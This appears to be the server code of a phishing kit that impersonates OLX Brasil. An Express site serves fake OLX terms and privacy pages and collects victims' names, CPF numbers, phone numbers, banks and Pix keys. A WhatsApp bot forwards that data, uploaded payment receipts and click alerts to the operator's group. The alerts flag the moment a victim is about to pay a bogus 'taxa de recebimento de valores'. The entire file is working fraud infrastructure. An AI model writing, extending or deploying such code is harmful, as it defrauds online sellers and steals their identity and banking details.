// Variáveis globais
let conn = null;
let isConnected = false;
let qrCode = null;

// Inicialização do WhatsApp
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
// const fs = require("fs");

const config = require("./config.json");
const destinatario = config.groupDestino;

async function connectToWhatsApp() {
  try {
    // Usar armazenamento de autenticação em múltiplos arquivos
    const { state, saveCreds } = await useMultiFileAuthState(
      "./bot/auth_info_baileys"
    );

    // Criar socket do WhatsApp
    const { version } = await fetchLatestBaileysVersion();
    console.log("baileys version", version);

    conn = makeWASocket({
      auth: state,
      version,
      logger: pino({ level: "silent" }),
    });

    // Escutar mensagens recebidas (para futuras implementações)
    const dataVendas = JSON.parse(
      fs.readFileSync(path.join(__dirname, "data", "vendas.json"))
    );

    conn.ev.on("messages.upsert", async (m) => {
      try {
        if (!m.messages) return;
        const mek = m.messages[0];
        if (!mek.message) return;
        if (mek.key.fromMe) return;
        if (mek.key && mek.key.remoteJid === "status@broadcast") return;

        // console.log("Mensagem recebida:", mek);
        require("./bot/system/admins")(conn, mek, dataVendas);
      } catch (error) {
        console.error("Erro ao processar mensagem:", error);
      }
    });

    // Quando a conexão for atualizada

    // Salvar credenciais quando autenticado
    conn.ev.on("creds.update", () => saveCreds());

    conn.ev.on("connection.update", (update) => {
      const { connection, lastDisconnect, qr } = update;

      // Armazenar QR code para exibi-lo na interface administrativa (se necessário)
      if (qr) {
        // Exibe o QR manualmente
        const qrcode = require("qrcode-terminal");
        qrcode.generate(qr, { small: true });
      }

      // Se conectado
      if (connection === "open") {
        isConnected = true;
        console.log("Conectado ao WhatsApp");
        conn.sendMessage(destinatario, {
          text: "*Conexão estabelecida com sucesso!*",
        });

        // const { exec } = require("child_process");
        // exec(
        //   "cd bot/auth_info_baileys && find . ! -name 'creds.json' -type f -exec rm -f {} +"
        // );
      }

      // Se desconectado
      if (connection === "close") {
        isConnected = false;
        const shouldReconnect =
          lastDisconnect?.error?.output?.statusCode !==
          DisconnectReason.loggedOut;

        console.log(
          "Conexão fechada devido a ",
          lastDisconnect?.error,
          ", reconectando: ",
          shouldReconnect
        );

        // Reconectar se não estiver deslogado
        if (shouldReconnect) {
          connectToWhatsApp();
        }
      }
    });
  } catch (error) {
    console.error("Erro na conexão com WhatsApp:", error);
  }
}

 


// Conexão do Site:

const express = require("express");
const path = require("path");
const fs = require("fs");
const axios = require("axios");
const multer = require("multer");
const { v4: uuidv4 } = require("uuid");

// Configurar armazenamento para uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadDir = path.join(__dirname, "uploads");
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const fileExt = path.extname(file.originalname);
    cb(null, `comprovante-${uuidv4()}${fileExt}`);
  },
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limite
  fileFilter: function (req, file, cb) {
    const allowedTypes = /jpeg|jpg|png|pdf/;
    const extname = allowedTypes.test(
      path.extname(file.originalname).toLowerCase(),
    );
    const mimetype = allowedTypes.test(file.mimetype);

    if (extname && mimetype) {
      return cb(null, true);
    }
    cb(
      new Error("Apenas arquivos de imagem (JPEG, PNG) ou PDF são permitidos!"),
    );
  },
});

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para logs de requisições
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Middleware para processar dados de formulário e JSON
app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: "10mb" }));

// Servir arquivos estáticos
app.use(express.static(path.join(__dirname, "public")));
app.use("/data", express.static(path.join(__dirname, "data")));
app.use("/uploads", express.static(path.join(__dirname, "uploads")));

// Proxy de imagens remotas para evitar bloqueios de hotlink
app.get("/proxy-image", async (req, res) => {
  const imageUrl = req.query.url;
  if (!imageUrl || !/^https?:\/\//i.test(imageUrl)) {
    return res.status(400).send("URL inválida");
  }

  try {
    const response = await axios.get(imageUrl, {
      responseType: "arraybuffer",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        Accept: "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        Referer: "https://www.olx.com.br/",
      },
      validateStatus: null,
    });

    if (response.status !== 200) {
      return res.status(response.status).send("Falha ao buscar imagem remota");
    }

    const contentType = response.headers["content-type"] || "image/jpeg";
    res.set("Content-Type", contentType);
    res.send(response.data);
  } catch (error) {
    console.error("Erro ao proxy de imagem:", error.message || error);
    res.status(502).send("Erro ao buscar imagem remota");
  }
});

// Função para verificar status do WhatsApp
function verificarStatusWhatsApp() {
  console.log(
    `Status da conexão WhatsApp: ${isConnected ? "Conectado" : "Desconectado"}`
  );
  return isConnected;
}

// Função melhorada para enviar mensagem WhatsApp
async function enviarMensagemWhatsApp(mensagem) {
  console.log("Iniciando envio de mensagem WhatsApp...");

  try {
    // Verificar se está conectado
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Tentando reconectar...");
      await connectToWhatsApp().catch((reconnectError) => {
        console.error("Falha ao tentar reconectar WhatsApp:", reconnectError);
      });

      // Pequeno atraso para dar tempo à conexão se estabilizar
      await new Promise((resolve) => setTimeout(resolve, 3000));

      if (!isConnected || !conn) {
        console.error("WhatsApp continua desconectado após tentativa de reconexão.");
        return {
          success: false,
          message: "WhatsApp não está conectado no momento. Tente novamente em alguns segundos.",
        };
      }
    }

    // ID do grupo ou contato (pode ser alterado conforme necessário)
    console.log(`Tentando enviar mensagem para: ${destinatario}`);

    // Enviar a mensagem
    await conn.sendMessage(destinatario, { text: mensagem });
    console.log("Mensagem enviada com sucesso!");

    return { success: true, message: "Mensagem enviada com sucesso" };
  } catch (error) {
    console.error("Erro detalhado ao enviar mensagem:", error);
    return {
      success: false,
      message: `Erro ao enviar mensagem: ${error.message}`,
      error: error,
    };
  }
}

// Função para enviar arquivo pelo WhatsApp
async function enviarArquivoWhatsApp(filePath, caption) {
  console.log("Iniciando envio de arquivo WhatsApp...");

  try {
    // Verificar se está conectado
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Status:", isConnected);
      return { success: false, message: "WhatsApp não está conectado" };
    }

    // ID do grupo ou contato (pode ser alterado conforme necessário)
    // const destinatario = "120363397924256528@g.us"; // ID do grupo

    // Verificar se o arquivo existe
    if (!fs.existsSync(filePath)) {
      console.error(`Arquivo não encontrado: ${filePath}`);
      return { success: false, message: "Arquivo não encontrado" };
    }

    // Lê o arquivo para buffer
    const fileBuffer = fs.readFileSync(filePath);
    const fileExt = path.extname(filePath).toLowerCase();
    const fileName = path.basename(filePath);

    // Determinar o tipo de mídia com base na extensão
    let messageContent;
    if (fileExt === ".pdf") {
      messageContent = {
        document: fileBuffer,
        fileName: fileName,
        caption: caption,
      };
    } else {
      // para imagens (.jpg, .png, etc)
      messageContent = {
        image: fileBuffer,
        caption: caption,
      };
    }

    // Enviar o arquivo para o WhatsApp
    await conn.sendMessage(destinatario, messageContent);
    console.log("Arquivo enviado com sucesso!");

    return { success: true, message: "Arquivo enviado com sucesso" };
  } catch (error) {
    console.error("Erro ao enviar arquivo:", error);
    return {
      success: false,
      message: `Erro ao enviar arquivo: ${error.message}`,
      error: error,
    };
  }
}

// Endpoint para receber dados bancários e enviar para WhatsApp
app.post("/api/enviar-dados-bancarios", async (req, res) => {
  console.log("Recebendo requisição para enviar dados bancários");

  try {
    const dados = req.body;
    console.log("Dados recebidos:", JSON.stringify(dados));

    // Verificar se os dados são válidos
    if (!dados.nome || !dados.email || !dados.telefone || !dados.cpf) {
      console.error("Dados incompletos recebidos");
      return res.status(400).json({
        success: false,
        message: "Dados pessoais ou de endereço incompletos",
      });
    }

    // Verificar status do WhatsApp antes de tentar enviar
    if (!verificarStatusWhatsApp()) {
      console.error("Tentativa de envio com WhatsApp desconectado");
      return res.status(503).json({
        success: false,
        message:
          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
      });
    }

    // Formatar mensagem com os dados recebidos
    const mensagem =
      `*Novos dados bancários recebidos*\n\n` +
      `*Dados Pessoais:*\n` +
      `Nome: ${dados.nome}\n` +
      `Email: ${dados.email}\n` +
      `Telefone: ${dados.telefone}\n` +
      `CPF: ${dados.cpf}\n\n` +
      `*Dados Bancários:*\n` +
      `Banco: ${dados.banco}\n` +
      `Tipo de Chave Pix: ${dados["chave-pix-tipo"]}\n` +
      `Chave Pix: ${dados["chave-pix"]}\n\n` +
      `Enviado em: ${new Date().toLocaleString("pt-BR")}`;

    console.log("Mensagem formatada, iniciando envio...");

    // Enviar mensagem para o WhatsApp
    const resultado = await enviarMensagemWhatsApp(mensagem);
    console.log("Resultado do envio:", resultado);

    if (resultado.success) {
      res.json({
        success: true,
        message: "Dados enviados com sucesso para o WhatsApp",
      });
    } else {
      res.status(500).json({
        success: false,
        message: "Erro ao enviar mensagem para o WhatsApp",
        error: resultado.message,
      });
    }
  } catch (error) {
    console.error("Erro ao processar dados bancários:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message,
    });
  }
});

// Endpoint para obter dados da venda pelo ID
app.get("/api/venda/:id", (req, res) => {
  const id = req.params.id;

  // Carregar dados das vendas
  try {
    const vendasData = fs.readFileSync(
      path.join(__dirname, "data", "vendas.json"),
      "utf8"
    );
    const vendas = JSON.parse(vendasData);

    // Buscar venda pelo ID
    const venda = vendas.find((v) => v.codigo === id);

    if (venda) {
      const vendaComPagamento = {
        ...venda,
        pagamento: venda.pagamento || "",
        pagamentoTipo: venda.pagamentoTipo || "texto",
      };

      setTimeout(() => {
        res.json(vendaComPagamento);
      }, 300);
    } else {
      res.status(404).json({
        error: "Venda não encontrada",
        message: "Não foi possível encontrar uma venda com o código informado.",
      });
    }
  } catch (error) {
    console.error("Erro ao buscar dados da venda:", error);
    res.status(500).json({
      error: "Erro ao processar requisição",
      message:
        "Ocorreu um erro ao processar sua solicitação. Tente novamente mais tarde.",
    });
  }
});

// Endpoint para compatibilidade com URLs que usam "pag" na rota
app.get("/pag", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Endpoint para acessar a página de dados bancários (usando .html em vez de .php)
app.get("/pag/dados.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "pag", "dados.html"));
});

// Endpoint para acessar a página de alerta
app.get("/pag/alerta.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "pag", "alerta.html"));
});

// Endpoint para simular .php (para compatibilidade com o formato solicitado)
app.get("/pag/alerta.php", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "pag", "alerta.html"));
});

// Endpoint para buscar todas as vendas (útil para dashboard)
app.get("/api/vendas", (req, res) => {
  try {
    const vendasData = fs.readFileSync(
      path.join(__dirname, "data", "vendas.json"),
      "utf8"
    );
    const vendas = JSON.parse(vendasData);
    res.json(vendas);
  } catch (error) {
    console.error("Erro ao buscar todas as vendas:", error);
    res.status(500).json({ error: "Erro ao processar requisição" });
  }
});

// Endpoint para termos de uso (retorna um JSON simples)
app.get("/api/termos", (req, res) => {
  res.json({
    titulo: "Termos de Uso da OLX Brasil",
    atualizado: "01/04/2023",
    conteudo: "Este documento apresenta os termos e condições gerais...",
  });
});

// Endpoint para política de privacidade (retorna um JSON simples)
app.get("/api/privacidade", (req, res) => {
  res.json({
    titulo: "Política de Privacidade da OLX Brasil",
    atualizado: "01/04/2023",
    conteudo: "A OLX Brasil está comprometida em proteger sua privacidade...",
  });
});

// Endpoint para receber comprovante e enviar via WhatsApp
app.post(
  "/api/enviar-comprovante",
  upload.single("comprovante"),
  async (req, res) => {
    console.log("Recebendo requisição para enviar comprovante");

    try {
      // Verificar se o arquivo foi recebido
      if (!req.file) {
        console.error("Nenhum arquivo recebido");
        return res.status(400).json({
          success: false,
          message: "Nenhum arquivo de comprovante recebido",
        });
      }

      console.log("Arquivo recebido:", req.file);

      // Verificar status do WhatsApp antes de tentar enviar
      if (!verificarStatusWhatsApp()) {
        console.error("Tentativa de envio com WhatsApp desconectado");
        return res.status(503).json({
          success: false,
          message:
            "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
        });
      }

      // Extrair dados do formulário
      const chavePix = req.body.chavePix || "Não informada";
      const valor = req.body.valor || "Não informado";

      // Formatar mensagem para o comprovante
      const caption =
        `*COMPROVANTE DE PAGAMENTO RECEBIDO*\n\n` +
        `*Dados do Pagamento:*\n` +
        `Valor: R$ ${valor}\n` +
        `Chave PIX: ${chavePix}\n\n` +
        `Recebido em: ${new Date().toLocaleString("pt-BR")}`;

      // Enviar o arquivo pelo WhatsApp
      const resultado = await enviarArquivoWhatsApp(req.file.path, caption);

      if (resultado.success) {
        res.json({
          success: true,
          message: "Comprovante enviado com sucesso para o WhatsApp",
        });
      } else {
        res.status(500).json({
          success: false,
          message: "Erro ao enviar comprovante para o WhatsApp",
          error: resultado.message,
        });
      }
    } catch (error) {
      console.error("Erro ao processar envio de comprovante:", error);
      res.status(500).json({
        success: false,
        message: "Erro ao processar sua solicitação",
        error: error.message,
      });
    }
  }
);

// Endpoint para notificar quando o cliente clica em "Continuar"
app.post("/api/notificar-clique-continuar", async (req, res) => {
  console.log("Cliente clicou em botão de ação");

  try {
    const dados = req.body;
    const codigoVenda = dados.codigo || "Não informado";
    const nomeProduto = dados.produto || "Não informado";
    const acao = dados.acao || "continuar";
    const valor = dados.valor || "";

    // Verificar status do WhatsApp antes de tentar enviar
    if (!verificarStatusWhatsApp()) {
      console.error(
        "WhatsApp desconectado - não foi possível enviar notificação de clique"
      );
      return res.status(503).json({
        success: false,
        message: "Serviço do WhatsApp indisponível",
      });
    }

    // Definir mensagem com base na ação
    let mensagem;

    if (acao === "clique_taxa") {
      mensagem =
        `*⚠️ CLIENTE VAI PAGAR A TAXA DE RECEBIMENTO DE VALORES ⚠️*\n\n` +
        `*Informações da venda:*\n` +
        `Código da venda: ${codigoVenda}\n` +
        `Produto: ${nomeProduto}\n` +
        `Valor da taxa: R$ ${valor}\n\n` +
        `Cliente clicou no botão para pagar a taxa de recebimento de valores e está sendo redirecionado para a página de pagamento.\n` +
        `Horário: ${new Date().toLocaleString("pt-BR")}`;
    } else {
      mensagem =
        `*Cliente clicou em CONTINUAR*\n\n` +
        `*Informações da venda:*\n` +
        `Código da venda: ${codigoVenda}\n` +
        `Produto: ${nomeProduto}\n\n` +
        `Cliente viu a mensagem de conclusão e clicou em continuar\n` +
        `Horário: ${new Date().toLocaleString("pt-BR")}`;
    }

    // Enviar mensagem para o WhatsApp
    const resultado = await enviarMensagemWhatsApp(mensagem);

    if (resultado.success) {
      res.json({
        success: true,
        message: "Notificação enviada com sucesso",
      });
    } else {
      res.status(500).json({
        success: false,
        message: "Erro ao enviar notificação para o WhatsApp",
        error: resultado.message,
      });
    }
  } catch (error) {
    console.error("Erro ao processar notificação de clique:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message,
    });
  }
});

// Importar o módulo qrcodepagamentos
const qrcodePagamentos = require('./js/qrcodepagamentos');

// Endpoint para gerar QR Code PIX
app.get("/api/gerar-qrcode-pix", async (req, res) => {
  try {
    console.log("Gerando QR Code PIX...");
    const resultado = await qrcodePagamentos.gerarQRCode();

    if (resultado?.status === 404 || resultado?.status === 401 || resultado?.status === 403 || resultado?.status === 500) {
      const mensagemErro = resultado?.error || "Erro ao gerar QR Code PIX";
      console.error("Falha ao gerar QR Code PIX:", mensagemErro);

      try {
        await enviarMensagemWhatsApp(
          `*⚠️ ERRO AO GERAR QR CODE PIX ⚠️*\n\n${mensagemErro}\n\nHorário: ${new Date().toLocaleString("pt-BR")}`,
        );
      } catch (notifyError) {
        console.error("Erro ao enviar notificação do WhatsApp:", notifyError);
      }

      return res.status(resultado?.status || 500).json({
        success: false,
        message: "Não foi possível gerar o QR Code PIX",
        error: mensagemErro,
      });
    }

    if (!resultado || !resultado.imgBase64) {
      console.error("Erro ao gerar QR Code PIX: Resultado inválido");
      return res.status(500).json({
        success: false,
        message: "Não foi possível gerar o QR Code PIX",
        resultado,
      });
    }

    res.json({
      success: true,
      qrCodeBase64: resultado.imgBase64,
      pixTitle: resultado.pixTitle,
    });
  } catch (error) {
    console.error("Erro ao gerar QR Code PIX:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao gerar QR Code PIX",
      error: error.message,
    });
  }
});

// Rota padrão para qualquer outra solicitação (SPA pattern)
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Middleware para tratamento de erros
app.use((err, req, res, next) => {
  console.error("Erro na aplicação:", err);
  res
    .status(500)
    .send("Ocorreu um erro no servidor. Tente novamente mais tarde.");
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
  console.log(`Acesse: http://localhost:${PORT}/pag/?id=KFTKWNQVMD`);
  connectToWhatsApp();
});
